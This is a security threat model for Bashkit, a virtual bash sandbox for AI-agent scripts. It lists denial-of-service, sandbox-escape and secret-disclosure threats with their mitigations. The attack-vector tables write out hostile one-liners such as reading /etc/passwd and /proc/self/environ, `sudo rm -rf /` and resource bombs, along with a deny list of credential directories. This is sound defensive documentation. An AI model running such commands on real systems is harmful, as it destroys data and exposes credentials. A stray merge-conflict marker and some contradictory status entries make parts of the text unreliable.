# Bashkit Threat Model

## Status

Living document

## Overview

Bashkit is a virtual bash interpreter for multi-tenant environments, primarily designed for AI agent script execution. This document analyzes security threats and mitigations.

**Threat Actors**: Malicious or buggy scripts from untrusted sources (AI agents, users)
**Assets**: Host CPU, memory, filesystem, network, secrets, other tenants

---

## Threat ID Management

This section documents the process for managing stable threat IDs.

### ID Scheme

All threats use a stable ID format: `TM-<CATEGORY>-<NUMBER>`

| Prefix | Category | Description |
|--------|----------|-------------|
| TM-DOS | Denial of Service | Resource exhaustion, infinite loops, CPU/memory attacks |
| TM-ESC | Sandbox Escape | Filesystem escape, process escape, privilege escalation |
| TM-INF | Information Disclosure | Secrets access, host info leakage, data exfiltration |
| TM-INJ | Injection | Command injection, path injection |
| TM-NET | Network Security | DNS manipulation, HTTP attacks, network bypass |
| TM-ISO | Isolation | Multi-tenant cross-access |
| TM-INT | Internal Errors | Panic recovery, error message safety, unexpected failures |
| TM-GIT | Git Security | Repository access, identity leak, remote operations |
| TM-LOG | Logging Security | Sensitive data in logs, log injection, log volume attacks |
| TM-CRY | Cryptographic Material Security | Private key handling, zeroization, key lifetime minimization |
| TM-PY | Python Security | Embedded Python sandbox escape, VFS isolation, resource limits |
| TM-TS | TypeScript Security | Embedded TypeScript sandbox escape, VFS isolation, resource limits |
| TM-SQL | SQLite Security | Embedded SQLite sandbox escape, VFS isolation, resource limits |
| TM-UNI | Unicode Security | Byte-boundary panics, invisible chars, homoglyphs, normalization |

### Adding New Threats

1. **Assign ID**: Use next available number in category (e.g., TM-DOS-010)
2. **Never reuse IDs**: Deprecated threats keep their ID with `[DEPRECATED]` prefix
3. **Update public doc**: Add entry to `crates/bashkit/docs/threat-model.md`
4. **Add code comment**: Reference threat ID at mitigation point (see format below)
5. **Add test**: Create test in `tests/threat_model_tests.rs` referencing ID

### Code Comment Format

```rust
// THREAT[TM-XXX-NNN]: Brief description of the threat being mitigated
// Mitigation: What this code does to prevent the attack
```

### Public Documentation

The public-facing threat model lives in `crates/bashkit/docs/threat-model.md` and is
embedded in rustdoc. It contains:
- High-level threat categories
- Attack vectors and mitigations
- Links to relevant code and tests
- Caller responsibilities

---

## Trust Model

```
┌─────────────────────────────────────────────────────────────┐
│                      UNTRUSTED                               │
│  ┌─────────────────────────────────────────────────────┐    │
│  │              Script Input (bash code)                │    │
│  └─────────────────────────────────────────────────────┘    │
│                           │                                  │
│                           ▼                                  │
│  ┌─────────────────────────────────────────────────────┐    │
│  │     TRUST BOUNDARY: Bash::exec(&str)                │    │
│  └─────────────────────────────────────────────────────┘    │
│                           │                                  │
└───────────────────────────┼──────────────────────────────────┘
                            ▼
┌─────────────────────────────────────────────────────────────┐
│                      VIRTUAL                                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │  Parser  │→ │Interpreter│→ │Virtual FS│  │ Network  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
│  Controls: Resource Limits, FS Isolation, Network Allowlist │
└─────────────────────────────────────────────────────────────┘
```

---

## Threat Analysis by Category

### 1. Resource Exhaustion (DoS)

#### 1.1 Memory Exhaustion

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-DOS-001 | Large script input | `Bash::exec(huge_string)` | `max_input_bytes` limit (10MB) | **MITIGATED** |
| TM-DOS-002 | Output flooding | `yes \| head -n 1000000000` | Command limit stops loop | Mitigated |
| TM-DOS-003 | Variable explosion | `x=$(cat /dev/urandom)` | /dev/urandom returns bounded 8KB | Mitigated |
| TM-DOS-004 | Array growth | `arr+=(element)` in loop | Command limit | Mitigated |

**Current Risk**: LOW - Input size and command limits prevent unbounded memory consumption

**Implementation**: `ExecutionLimits` in `limits.rs`:
```rust
max_input_bytes: 10_000_000,    // 10MB script limit (TM-DOS-001)
max_commands: 10_000,           // Command limit per exec() call (TM-DOS-002, TM-DOS-004)
```

**Scope**: Limits are enforced **per `exec()` call**. Counters reset at the start of
each invocation via `ExecutionCounters::reset_for_execution()`, so a prior script
hitting the limit does not permanently poison the session. The timeout (30s) provides
the session-level backstop.

#### 1.5 Filesystem Exhaustion

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-DOS-005 | Large file creation | `dd if=/dev/zero bs=1G count=100`; `truncate -s 4G /tmp/p` | `max_file_size` limit; builtins that resize VFS file buffers validate target lengths before allocation | **MITIGATED** |
| TM-DOS-006 | Many small files | `for i in $(seq 1 1000000); do touch $i; done` | `max_file_count` limit | **MITIGATED** |
| TM-DOS-007 | Zip bomb | `gunzip bomb.gz` (small file → huge output) | Decompression limit | **MITIGATED** |
| TM-DOS-008 | Tar bomb | `tar -xf bomb.tar` (many files / large files) | FS limits | **MITIGATED** |
| TM-DOS-009 | Recursive copy | `cp -r /tmp /tmp/copy` | FS limits | **MITIGATED** |
| TM-DOS-010 | Append flood | `while true; do echo x >> file; done` | FS limits + loop limit | **MITIGATED** |
| TM-DOS-034 | TOCTOU in append_file | Concurrent appends between read-lock and write-lock bypass size checks | Single write lock for entire read-check-write | **FIXED** |
| TM-DOS-035 | OverlayFs limit check upper-only | `check_write_limits()` ignores lower layer usage, allowing combined usage to exceed limits | `OverlayFs::check_write_limits` now uses `compute_usage()` (combined upper + lower minus overrides); upper layer is type-fixed to `InMemoryFs` so its own limits are bypassable but irrelevant | **MITIGATED** |
| TM-DOS-036 | OverlayFs usage double-count | `compute_usage()` double-counts overwritten/whited-out files | `compute_usage()` subtracts shadowed lower files when the upper layer carries an override or whiteout | **MITIGATED** |
| TM-DOS-037 | OverlayFs chmod CoW bypass | `chmod` copy-on-write writes to unlimited upper layer, bypassing overlay limits | `chmod`'s file/directory CoW path checks `check_write_limits()` and `check_dir_count()` before promoting to upper | **MITIGATED** |
| TM-DOS-038 | OverlayFs incomplete recursive whiteout | `rm -r /dir` only whiteouts directory, not children; lower layer files remain visible | `OverlayFs::remove(recursive=true)` walks the lower layer and writes a whiteout per surviving descendant; `is_whiteout()` also checks ancestor whiteouts | **MITIGATED** |
| TM-DOS-039 | Missing validate_path in VFS methods | `remove`, `stat`, `read_dir`, `copy`, `rename`, `symlink`, `chmod` skip `validate_path()` | All `FileSystem` methods on `InMemoryFs` and `OverlayFs` call `validate_path()`; `MountableFs` validates via the root limits before delegating (TM-DOS-046) | **MITIGATED** |
| TM-DOS-040 | Integer truncation on 32-bit | `u64 as usize` casts in network/Python extension silently truncate on 32-bit, bypassing size checks | All `u64`-to-`usize` size-check casts in `network/client.rs` (Content-Length checks) and `bashkit-python/src/lib.rs` (limits propagation) use `usize::try_from(...).unwrap_or(usize::MAX)` so over-`usize` values fail safe instead of wrapping | **MITIGATED** |

> **Scope of the FS quotas above (TM-DOS-005/006/010, `max_file_size` /
> `max_file_count` / `max_total_bytes`)**: these are enforced by the
> in-memory and overlay backends. They do **not** apply to a `RealFs` mount
> in `RealFsMode::ReadWrite` — `RealFs::limits()` returns `unlimited()` and
> writes go straight to the host with no byte/count quota. This is by design
> (`--mount-rw` is sandbox-breaking, see TM-ESC-030), but it means a script
> with a writable real-FS mount can exhaust host disk/inodes. Use
> `--mount-ro` for untrusted scripts.

**TM-DOS-034**: Fixed. `InMemoryFs::append_file()` now uses a single write lock for the entire
read-check-write operation, preventing TOCTOU races. See `fs/memory.rs:940-942`.

**TM-DOS-035** (mitigated): `OverlayFs::check_write_limits` now sources its accounting from
`compute_usage()`, which sums combined upper + lower bytes minus overrides. Regression tests:
`tests/threat_model_tests.rs::overlay_limit_accounting::tm_dos_035_combined_byte_limit` and
`…tm_dos_035_combined_file_count_limit`.

**TM-DOS-036** (mitigated): `compute_usage()` deducts a lower file's bytes when the upper
carries an override (overwrite) or whiteout (delete). Regression tests:
`overlay_limit_accounting::tm_dos_036_no_double_count_on_override` and
`…tm_dos_036_whiteout_deducts_usage`.

**TM-DOS-037** (mitigated): The CoW path on `chmod` (file or directory) calls
`check_write_limits()` / `check_dir_count()` before promoting the entry to `self.upper`, so
chmod cannot smuggle bytes or directory entries past the overlay's combined limit. Regression
tests: `overlay_limit_accounting::tm_dos_037_chmod_file_cow_checks_limits`,
`…tm_dos_037_chmod_dir_cow_checks_limits`,
`…tm_dos_037_mkdir_checks_dir_limits`,
`…tm_dos_037_recursive_mkdir_counts_all_new_dirs`.

**TM-DOS-038** (mitigated): `OverlayFs::remove(recursive=true)` walks the lower-layer subtree
and emits a whiteout for every surviving descendant; `is_whiteout()` additionally treats any
descendant of a whited-out ancestor as hidden. Regression tests:
`overlay_limit_accounting::tm_dos_038_recursive_delete_hides_all_children` and
`…tm_dos_038_recursive_delete_deducts_all_bytes`.

**TM-DOS-039** (mitigated): Every `FileSystem` method on `InMemoryFs` and `OverlayFs` calls
`validate_path()`; `MountableFs` validates each path against the root layer's limits before
delegation (see TM-DOS-046). Regression tests: `path_validation_security` module
(8 tests) plus the overlay/mountable tests in `security_audit_pocs`.

**TM-DOS-040**: `network/client.rs:236,419` and `bashkit-python/src/lib.rs:197,200` cast `u64` to
`usize`. On 32-bit, `Content-Length: 5GB` truncates to ~1GB. Fix: use `usize::try_from()`.

**Current Risk**: MEDIUM - OverlayFs limit accounting has multiple gaps (TM-DOS-034 to TM-DOS-039)

**Implementation**: `FsLimits` struct in `fs/limits.rs`:
```rust
FsLimits {
    max_total_bytes: 100_000_000,    // 100MB total (TM-DOS-005, TM-DOS-008, TM-DOS-009)
    max_file_size: 10_000_000,       // 10MB per file (TM-DOS-005, TM-DOS-007)
    max_file_count: 10_000,          // 10K files max (TM-DOS-006, TM-DOS-008)
}
```

**Zip Bomb Protection** (TM-DOS-007):
- Decompression operations check output size against `max_file_size`
- Archive extraction checks total extracted size against `max_total_bytes`
- Extraction aborts early if limits would be exceeded

**Monitoring**: `du` and `df` builtins allow scripts to check usage

#### 1.6 Path and Name Attacks

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-DOS-011 | Symlink loops | `ln -s /a /b; ln -s /b /a` | No symlink following | **MITIGATED** |
| TM-DOS-012 | Deep directory nesting | `mkdir -p a/b/c/.../z` (1000 levels) | `max_path_depth` limit (100) | **MITIGATED** |
| TM-DOS-013 | Long filenames | Create 10KB filename | `max_filename_length` (255) + `max_path_length` (4096) | **MITIGATED** |
| TM-DOS-014 | Many directory entries | Create 1M files in one dir | `max_file_count` limit | **MITIGATED** |
| TM-DOS-015 | Unicode path attacks | Homoglyph/RTL override chars | `validate_path()` rejects control chars and bidi overrides | **MITIGATED** |

**Current Risk**: LOW - All vectors protected

**Implementation**: `FsLimits` in `fs/limits.rs`:
```rust
max_path_depth: 100,           // Max directory nesting (TM-DOS-012)
max_filename_length: 255,      // Max single component (TM-DOS-013)
max_path_length: 4096,         // Max total path (TM-DOS-013)
// validate_path() rejects control chars and bidi overrides (TM-DOS-015)
```

**Note**: Symlink loops (TM-DOS-011) are mitigated because InMemoryFs stores symlinks but doesn't
follow them during path resolution - symlink targets are only returned by `read_link()`.

#### 1.2 Infinite Loops

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-DOS-016 | While true | `while true; do :; done` | Loop limit (10K) | **MITIGATED** |
| TM-DOS-017 | For loop | `for i in $(seq 1 inf); do` | Loop limit | **MITIGATED** |
| TM-DOS-018 | Nested loops | `for i in ...; do for j in ...; done; done` | Per-loop + `max_total_loop_iterations` (1M) | **MITIGATED** |
| TM-DOS-019 | Command loop | `echo 1; echo 2; ...` x 100K | Command limit (10K) | **MITIGATED** |

**Current Risk**: LOW - Loop and command limits prevent infinite execution

**Implementation**: `limits.rs`
```rust
max_loop_iterations: 10_000,           // Per-loop limit (TM-DOS-016, TM-DOS-017)
max_total_loop_iterations: 1_000_000,  // Global cap across all loops (TM-DOS-018)
max_commands: 10_000,                  // Per-exec() command limit (TM-DOS-019)
```

All counters (commands, loop iterations, total loop iterations, function depth)
reset at the start of each `exec()` call. This ensures limits protect against
runaway scripts without permanently breaking the session.

#### 1.3 Stack Overflow (Recursion)

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-DOS-020 | Function recursion | `f() { f; }; f` | Depth limit (100) | **MITIGATED** |
| TM-DOS-021 | Command sub nesting | `$($($($())))` | Child parsers inherit remaining depth budget + fuel from parent | **MITIGATED** |
| TM-DOS-022 | Parser recursion | Deeply nested `(((())))` | `max_ast_depth` limit (100) + `HARD_MAX_AST_DEPTH` cap (100) | **MITIGATED** |
| TM-DOS-026 | Arithmetic recursion and expansion amplification | `$((((...))))`, `a=a+a; $((a))`, `i=arr[i]; $((arr[i]))` | `MAX_ARITHMETIC_DEPTH` limit (50), shared expansion fuel, cycle detection, expanded-size cap | **MITIGATED** |
| TM-DOS-064 | Heredoc suffix re-injection CPU amplification | Many `: <<E && : <<E ...` heredocs on one logical line repeatedly copy command-line suffixes | `read_heredoc_with_strip_metered` reports re-injected suffix length; parser charges it to `max_parser_operations` fuel | **MITIGATED** |

**Current Risk**: LOW - Both execution and parser protected

**Implementation**: `limits.rs`, `parser/mod.rs`, `interpreter/mod.rs`
```rust
max_function_depth: 100,      // Runtime recursion (TM-DOS-020, TM-DOS-021)
max_ast_depth: 100,           // Parser recursion (TM-DOS-022)
// TM-DOS-021: Child parsers in command/process substitution inherit remaining
// depth budget and fuel from parent parser (parser/mod.rs lines 1553, 1670)
<<<<<<< HEAD
// TM-DOS-026: Arithmetic evaluator tracks recursion depth, capped at 50
// (interpreter/mod.rs MAX_ARITHMETIC_DEPTH)
// TM-DOS-026: Arithmetic evaluator tracks recursion depth, capped at 50.
// Recursive variable expansion shares fuel, rejects variable cycles, and caps
// generated arithmetic expression bytes.
// (interpreter/mod.rs MAX_ARITHMETIC_DEPTH / MAX_ARITHMETIC_EXPANSION_*)
// TM-DOS-064: Heredoc rest-of-line re-injection is charged to parser fuel
```

**History** (TM-DOS-021): Previously marked MITIGATED but child parsers created via
`Parser::new()` used default limits, ignoring parent configuration. Fixed to propagate
`remaining_depth` and `fuel` from parent parser.

#### 1.4 CPU Exhaustion

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-DOS-023 | Long computation | Complex awk/sed regex | Timeout (30s) | **MITIGATED** |
| TM-DOS-024 | Parser hang | Malformed input | `parser_timeout` (5s) + `max_parser_operations` | **MITIGATED** |
| TM-DOS-025 | Regex backtrack | `grep "a](*b)*c" file`; `grep -P '(a+)+$' file` | Default `regex` engine is linear-time (no catastrophic backtracking); `grep -P`/`sed` fancy-regex paths are capped by `FANCY_BACKTRACK_LIMIT` (1M steps) — a match that exceeds it yields "no match" rather than hanging | **MITIGATED** |
| TM-DOS-027 | Builtin parser recursion | Deeply nested awk/jq expressions | `MAX_AWK_PARSER_DEPTH` (100) + `MAX_JQ_JSON_DEPTH` (100) | **MITIGATED** |
| TM-DOS-028 | Diff algorithm DoS | `diff` on two large unrelated files | LCS matrix capped at 10M cells; falls back to simple line-by-line output | **MITIGATED** |
| TM-DOS-029 | Arithmetic overflow/panic | `$(( 2 ** -1 ))`, `$(( 1 << 64 ))`, `i64::MIN / -1` | Arithmetic ops use `wrapping_*` / saturating semantics — `i64::MIN / -1` and unary negate go through `wrapping_neg`; `<<` / `>>` clamp the shift amount | **MITIGATED** |
| TM-DOS-030 | Parser limit bypass via eval/source/trap | `eval`, `source`, trap handlers now use `Parser::with_limits()` | — | **FIXED** (2026-03 audit verified) |
| TM-DOS-031 | ExtGlob exponential blowup | `+(a\|aa)` against long string causes O(n!) recursion in `glob_match_impl` | `glob_match_impl` carries a recursion-depth cap and bails on excessive depth (`interpreter/glob.rs:162,324`); aliases that expand to huge brace ranges go through the same parser-budget check (`interpreter/mod.rs:4216`) | **MITIGATED** |
| TM-DOS-035 | DEBUG trap recursive amplification | `trap 'a=1;b=2;...' DEBUG` amplifies N commands to N*M | Suppress DEBUG trap inside trap handlers (`in_trap` guard) | **FIXED** |
| TM-DOS-032 | Tokio runtime exhaustion (Python) | Rapid `execute_sync()` calls each create new tokio runtime, exhausting OS threads | `PyBash` and `BashTool` create one `Arc<Runtime>` per instance in `__new__` via `make_runtime()` and reuse it for every `execute_sync` call; no per-call runtime construction | **MITIGATED** |
| TM-DOS-033 | AWK unbounded loops | `BEGIN { while(1){} }` has no iteration limit in AWK interpreter | Timeout (30s) backstop | **PARTIAL** |
| TM-DOS-051 | YAML parser unbounded recursion | `yaml get key` on deeply nested YAML input causes stack overflow in `parse_yaml_block`/`parse_yaml_map`/`parse_yaml_list` | `parse_yaml_block` carries a `depth: usize` parameter; depth > `MAX_YAML_DEPTH = 100` returns an `ERROR: maximum nesting depth exceeded` value instead of recursing | **MITIGATED** |
| TM-DOS-052 | Template engine unbounded recursion | `{{#if}}` and `{{#each}}` blocks call `render_template` recursively with no depth limit | `render_template_inner` checks `depth > MAX_TEMPLATE_DEPTH = 100` and returns a `template: maximum nesting depth exceeded` error | **MITIGATED** |
| TM-DOS-053 | Template `{{#each}}` output explosion | `{{#each arr}}` on large JSON array produces O(n * body) output | Bounded by JSON data file size (max_file_size) | **MITIGATED** |
| TM-DOS-054 | `glob --files` inherits ExtGlob blowup | `glob --files "+(a|aa)" /dir` dispatches to `glob_match` with same exponential cost as TM-DOS-031 | Same as TM-DOS-031 — `glob_match_impl` recursion-depth cap covers `glob --files` callers | **MITIGATED** |
| TM-DOS-055 | `split` file count amplification | `split -l 1 bigfile` creates one output file per line; bounded by `max_file_count` FS limit | FS limits (TM-DOS-006) | **MITIGATED** |
| TM-DOS-056 | `source` self-recursion stack overflow | Script that sources itself causes unbounded recursion; function depth limit doesn't apply to `source` | `source` increments the same call-depth counter as functions, so self- and mutual-recursion hit the configured `max_function_depth` and return a clean error rather than a SIGABRT | **MITIGATED** |
| TM-DOS-057 | `sleep` bypasses execution timeout | `sleep`, `(sleep N)`, `echo x \| sleep N`, `sleep N & wait`, `timeout N sleep N` all ignore `ExecutionLimits::timeout` | `Bash::exec_impl` wraps execution in `tokio::time::timeout(limits.timeout, …)` on non-WASM targets; WASM currently executes without that global timeout wrapper (`#[cfg(target_family = "wasm")]`) | **PARTIAL** |
| TM-DOS-058 | Single-builtin unbounded output | `seq 1 1000000` produces 1M lines despite command limit; single builtin call generates unbounded output (see also #648) | `ExecutionLimits::max_stdout_bytes` and `max_stderr_bytes` truncate captured output (defaults set in `ExecutionLimits::new()`); see #648 | **MITIGATED** |
| TM-DOS-059 | Parameter expansion replacement bomb | `${x//a/$(printf 'b%.0s' {1..1000})}` on large `x` amplifies output multiplicatively (10K × 1K = 10MB) | `max_total_variable_bytes` + `max_stdout_bytes` | **MITIGATED** |
| TM-DOS-060 | Sparse array huge-index allocation | `arr[999999999]=x` could allocate ~1B empty slots if arrays are Vec-backed; negative indices could cause OOB | HashMap-based arrays; `max_array_entries` caps total entries | **MITIGATED** |
| TM-DOS-061 | Snapshot function restore bypasses parser/function limits | Crafted snapshot restores prebuilt or deeply nested functions that exceed the current tenant's parser depth or function memory budget | Re-parse restored function source with current `ExecutionLimits`; re-apply function memory budget before insertion | **MITIGATED** |
| TM-DOS-062 | jq file binding amplification | Repeated `--rawfile` / `--slurpfile` bindings to one max-sized VFS file multiply retained jq globals and `$ARGS.named` values without consuming more VFS quota | `MAX_FILE_VAR_REQUESTS` caps binding count; `MAX_FILE_VAR_BYTES` counts cumulative file bytes per binding before retaining globals | **MITIGATED** |
| TM-DOS-063 | Persistent fd exhaustion | `exec N>/tmp/f` across many `N` values grows `exec_fd_table`/coproc fd buffers for the session | `ExecutionLimits::max_file_descriptors` (default 1024) caps persistent custom descriptors before inserts; reusing existing fd entries and standard fds 0/1/2 do not count | **MITIGATED** |

**TM-DOS-051** (mitigated): `builtins/yaml.rs` — `parse_yaml_block`, `parse_yaml_map`,
`parse_yaml_list` carry a `depth: usize` parameter. When `depth > MAX_YAML_DEPTH = 100`,
`parse_yaml_block` short-circuits with an `ERROR: maximum nesting depth exceeded` value
instead of recursing further. `catch_unwind` (TM-INT-001) remains a backstop, but is no
longer the primary defence. Regression tests:
`tests/threat_model_tests.rs::yaml_template_depth::tm_dos_051_*`.

**TM-DOS-052** (mitigated): `builtins/template.rs:render_template_inner()` receives a
`depth` arg that increments on each `{{#if}}` / `{{#each}}` recursion. When
`depth > MAX_TEMPLATE_DEPTH = 100`, the call returns a clean `template: maximum nesting
depth exceeded` error. Regression test:
`tests/threat_model_tests.rs::yaml_template_depth::tm_dos_052_template_if_depth_bomb`.

**Current Risk**: LOW — TM-DOS-029, TM-DOS-030, and TM-DOS-031 are all mitigated
(see the status table above). Their original write-ups are kept below for history.

**TM-DOS-029** (mitigated): Arithmetic exponentiation cast `i64` to `u32` (`right as u32`),
wrapping negatives; `i64::pow()` with a large exponent panicked or hung; shift operators panicked
if `right >= 64` or `right < 0`; `i64::MIN / -1` panicked. Resolved: arithmetic ops use `wrapping_*`,
shift amounts are masked, and the exponent is clamped (`interpreter/mod.rs` arithmetic evaluator).
The same `i64::MIN / -1` guard is now applied in the `expr` builtin (`checked_div`/`checked_rem`).

**TM-DOS-030** (fixed): `eval`, `source`, trap handlers, and alias expansion previously used
`Parser::new()`, ignoring configured `max_ast_depth` / `max_parser_operations`. Resolved: all of
these paths use `Parser::with_limits()`. Separately, `eval` and alias expansion now run their bodies
via `execute_script_body(.., run_exit_trap=false)` (like `source`) so they do not fire the EXIT trap
— previously they ran the unguarded EXIT trap, letting `trap 'eval :' EXIT` recurse one command per
level until the budget aborted.

**TM-DOS-031** (mitigated): ExtGlob `+(...)` / `*(...)` handlers recursed without a depth limit.
Resolved: `glob_match_impl` carries a recursion-depth cap and bails when exceeded
(`interpreter/glob.rs`).

**Implementation**: `limits.rs`, `builtins/awk.rs`, `builtins/jq/`, `builtins/diff.rs`
```rust
timeout: Duration::from_secs(30),       // Execution timeout (TM-DOS-023)
parser_timeout: Duration::from_secs(5), // Parser timeout (TM-DOS-024)
max_parser_operations: 100_000,         // Parser fuel (TM-DOS-024)
// TM-DOS-027: Builtin parser depth limits (compile-time constants)
// MAX_AWK_PARSER_DEPTH: 100  (builtins/awk.rs) - awk expression recursion
// MAX_JQ_JSON_DEPTH: 100     (builtins/jq/)  - JSON input nesting depth
// TM-DOS-028: Diff LCS matrix cap (builtins/diff.rs)
// MAX_LCS_CELLS: 10_000_000 - prevents O(n*m) memory/CPU blow-up
```

---

### 2. Sandbox Escape

#### 2.1 Filesystem Escape

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-ESC-001 | Path traversal | `cat ../../../etc/passwd` | Path normalization | **MITIGATED** |
| TM-ESC-002 | Symlink escape | `ln -s /etc/passwd /tmp/x` | Symlinks not followed | **MITIGATED** |
| TM-ESC-003 | Real FS access | Direct syscalls | No real FS by default; `RealFs` canonicalizes existing paths and nearest existing ancestors before attaching missing suffixes | **MITIGATED** |
| TM-ESC-004 | Mount escape | Mount real paths | MountableFs controlled | **MITIGATED** |
| TM-ESC-016 | Symlink escape via overlay rename | `ln -s /etc/passwd x; mv x y` | Overlay rename/copy preserve symlinks as symlinks | **FIXED** |
| TM-FS-013 | Permissive RealFs mount default | `mount_real_readonly_at("/", …)` exposes whole host without `allowed_mount_paths` | Allowlist-first: `/`, `/etc`, `/root`, `/Users`, `/home`, `/dev`, `/proc`, `/sys`, `/run`, `/var/run`, `/boot`, `/private`, and any path component matching `.ssh`, `.aws`, `.kube`, `.docker`, `.gnupg`, `.gcloud` are refused unless explicitly allowlisted | **MITIGATED** |

**Current Risk**: MEDIUM - Two open escape vectors (TM-ESC-012, TM-ESC-013) need remediation

**Implementation**: `fs/memory.rs` - `normalize_path()` function
- Collapses `..` components at path boundaries
- Ensures all paths stay within virtual root

| TM-ESC-012 | VFS limit bypass via public API | `add_file()` / `restore()` skip `validate_path()` and `check_write_limits()` | `InMemoryFs::add_file` and `InMemoryFs::restore` (`fs/memory.rs:704,832`) now run `validate_path` and `check_write_limits` like every other write path | **MITIGATED** |
| TM-ESC-013 | OverlayFs upper() exposes unlimited FS | `OverlayFs::upper()` returns `InMemoryFs` with `FsLimits::unlimited()` | `OverlayFs::with_limits` constructs the upper layer via `InMemoryFs::with_limits(limits.clone())`, mirroring the overlay's limits onto upper. `add_file()` / `restore()` on that upper now run `validate_path` + `check_write_limits` (TM-ESC-012), so direct `upper()` writes are bounded by the same quota | **MITIGATED** |
| TM-ESC-014 | BashTool custom builtins lost after first call | `std::mem::take` empties builtins on first `execute()`, removing security wrappers | Arc-cloned builtins survive across calls | **FIXED** |

**TM-ESC-012**: `InMemoryFs::add_file()` is `pub` and does not call `validate_path()` or
`check_write_limits()`. `restore()` deserializes without validation. Any code with `InMemoryFs`
access can bypass all limits. Fix: add limit checks or restrict visibility to `pub(crate)`.

**TM-ESC-013**: `OverlayFs::upper()` returns `&InMemoryFs` with unlimited limits. Callers can
write unlimited data via `overlay.upper().write_file()`. Fix: don't expose `upper()` publicly,
or return a view that enforces the overlay's limits.

**TM-ESC-014**: Fixed. `BashTool::create_bash()` now clones `Arc`-wrapped builtins instead of
taking ownership via `std::mem::take`. Custom builtins persist across multiple calls. See `tool.rs:659-662`.

**TM-ESC-016**: Fixed. `OverlayFs::rename` and `copy` previously used `read_file()` + `write_file()`
which silently failed on symlinks (since `read_file` intentionally doesn't follow symlinks per
TM-ESC-002). A symlink could not be renamed at all, but the underlying design gap meant any future
relaxation of symlink-following policy could expose the target. Fix: `rename`/`copy` now detect
symlinks via `stat()` and use `read_link()` + `symlink()` to preserve them. Same fix applied to
`MountableFs` cross-mount operations. See `fs/overlay.rs` and `fs/mountable.rs`.

#### 2.2 Process Escape

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-ESC-005 | Shell escape | `exec /bin/bash` | exec runs command within VFS sandbox then exits (no real process replacement); host binaries unreachable | **MITIGATED** |
| TM-ESC-006 | Subprocess | `./malicious` | Script execution runs within VFS sandbox (no host shell) | **MITIGATED** |
| TM-ESC-007 | Background proc | `malicious &` | Background not implemented | **MITIGATED** |
| TM-ESC-008 | eval injection | `eval "$user_input"` | eval runs in sandbox (builtins only) | **MITIGATED** |
| TM-ESC-015 | bash/sh escape | `bash -c "malicious"` | Sandboxed re-invocation (no external bash) | **MITIGATED** |
| TM-ESC-030 | mount-rw exposure to untrusted automation | Running untrusted scripts with `--mount-rw /` | CLI docs mark `--mount-rw` as sandbox-breaking; recommend `--mount-ro` when host access is needed | **MITIGATED** |

**Current Risk**: LOW - No external process execution capability

**Implementation**: Unimplemented commands return bash-compatible error:
- Exit code: 127
- Stderr: `bash: <cmd>: command not found`
- Script continues execution (unless `set -e`)

**bash/sh Re-invocation** (TM-ESC-015): The `bash` and `sh` commands are handled
specially to re-invoke the virtual interpreter rather than spawning external
processes. This enables common patterns while maintaining security:
- `bash -c "cmd"` executes within the same virtual environment constraints
- `bash script.sh` reads and interprets the script in-process
- `bash --version` returns Bashkit version (never real bash info)
- Resource limits and virtual filesystem are shared with parent
- No escape to host shell is possible

**Script Execution by Path** (TM-ESC-006): Scripts can be executed by absolute
path (`/path/to/script.sh`), relative path (`./script.sh`), or `$PATH` search.
All execution stays within the virtual interpreter — no OS subprocess is spawned:
- File must exist in VFS and have execute permission (mode & 0o111)
- Exit 127 for missing files, exit 126 for non-executable or directories
- Shebang line stripped; content parsed and executed as bash
- `$0` = script name, `$1..N` = arguments via call frame
- Resource limits and VFS constraints apply to executed scripts

#### 2.3 Privilege Escalation

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-ESC-009 | sudo/su | `sudo rm -rf /` | Not implemented | **MITIGATED** |
| TM-ESC-010 | setuid | Permission changes | Virtual FS, no real perms | **MITIGATED** |
| TM-ESC-011 | Capability abuse | Linux capabilities | Runs in-process | **MITIGATED** |

**Current Risk**: NONE - No privilege operations available

---

### 3. Information Disclosure

#### 3.1 Secrets Access

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-INF-001 | Env var leak | `echo $SECRET_KEY` | Env vars caller-controlled | **CALLER RISK** |
| TM-INF-002 | File secrets | `cat /secrets/key` | Virtual FS isolation | **MITIGATED** |
| TM-INF-003 | Proc secrets | `/proc/self/environ` | No /proc filesystem | **MITIGATED** |
| TM-INF-004 | Memory dump | Core dumps | No crash dumps | **MITIGATED** |

| TM-INF-013 | Host env leak via jq | jq now uses custom `$__bashkit_env__` variable, not `std::env` | — | **FIXED** (2026-03 audit verified) |
| TM-INF-014 | Real PID leak via $$ | `$$` now returns virtual PID (1) instead of real process ID | — | **FIXED** (2026-03 audit verified) |
| TM-INF-015 | URL credentials in errors | Allowlist "blocked" error echoes full URL including credentials | `network/allowlist.rs::redact_url` strips userinfo from the URL before formatting the `URL not in allowlist: …` error; covered by `test_redact_url_strips_credentials` and `test_blocked_url_with_credentials_is_redacted` | **MITIGATED** |
| TM-INF-016 | Internal state in error messages | `std::io::Error`, reqwest errors, Debug-formatted errors leak host paths/IPs/TLS info | `sanitize_error_message()` strips paths/IPs/TLS; `Error::network_sanitized()` wraps reqwest | **FIXED** |
| TM-INF-019 | `envsubst` exposes all env vars | `envsubst` substitutes `$VAR`/`${VAR}` from `ctx.env` — scripts can probe any env var | Same as TM-INF-001 (caller controls env) | **CALLER RISK** |
| TM-INF-020 | `template` exposes env vars via `{{var}}` | Template builtin looks up variables from env as fallback after shell vars and JSON data | Same as TM-INF-001 (caller controls env) | **CALLER RISK** |
| TM-INF-021 | Stack backtrace information disclosure | Panics leak internal source paths, dependency versions, and function names via stderr | Custom panic hook suppresses backtraces in CLI | **MITIGATED** |
